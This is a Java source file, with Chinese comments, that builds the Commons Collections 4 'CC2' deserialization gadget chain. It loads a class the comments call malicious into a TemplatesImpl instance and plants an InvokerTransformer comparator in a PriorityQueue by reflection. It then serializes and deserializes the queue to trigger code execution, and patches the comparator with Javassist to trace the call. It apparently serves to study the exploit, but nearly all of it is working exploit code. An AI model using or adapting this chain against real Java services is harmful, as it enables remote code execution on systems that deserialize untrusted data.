import javassist.*;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class MonitorCC2 {
    final static ClassPool pool = ClassPool.getDefault();
    final static ClassPool pool2 = ClassPool.getDefault();
    final static String classname = "org.apache.commons.collections4.comparators.TransformingComparator";

    public void studentDisplayMonitor() throws Exception{
        CtClass ss = pool.getCtClass(classname);
        CtClass ss2 = pool2.getCtClass("CC.TestTemplatesImpl");
        byte[] bytes = ss2.toBytecode();

        //反射创建TemplatesImpl
        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Constructor<?> constructor = aClass.getDeclaredConstructor(new Class[]{});
        Object TemplatesImpl_instance = constructor.newInstance();
        //将恶意类的字节码设置给_bytecodes属性
        Field bytecodes = aClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(TemplatesImpl_instance , new byte[][]{bytes});
        //设置属性_name为恶意类名
        Field name = aClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(TemplatesImpl_instance, "TestTemplatesImpl");

        CtClass.debugDump="./dump";
        String methodname = "compare";
        CtMethod compare = ss.getDeclaredMethod(methodname);
        String src = "if(true){" +
                "System.out.println(\"Hello siftDown123\");" +
                "}";
        compare.insertBefore(src);
        ss.toClass();

        //构造利用链
        InvokerTransformer transformer=new InvokerTransformer("newTransformer",null,null);
        TransformingComparator transformer_comparator =new TransformingComparator(transformer);

        //触发漏洞
        PriorityQueue queue = new PriorityQueue(2);
        queue.add(1);
        queue.add(1);
        //设置comparator属性
        Field field=queue.getClass().getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(queue,transformer_comparator);
        //设置queue属性
        field=queue.getClass().getDeclaredField("queue");
        field.setAccessible(true);
        //队列至少需要2个元素
        Object[] objects = new Object[]{TemplatesImpl_instance , TemplatesImpl_instance};
        field.set(queue,objects);

        //序列化 ---> 反序列化
        //FileOutputStream fs = new FileOutputStream("foo.ser");
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
    }

    public static void main(String[] args) throws Exception{
        MonitorCC2 m = new MonitorCC2();
        m.studentDisplayMonitor();
    }

}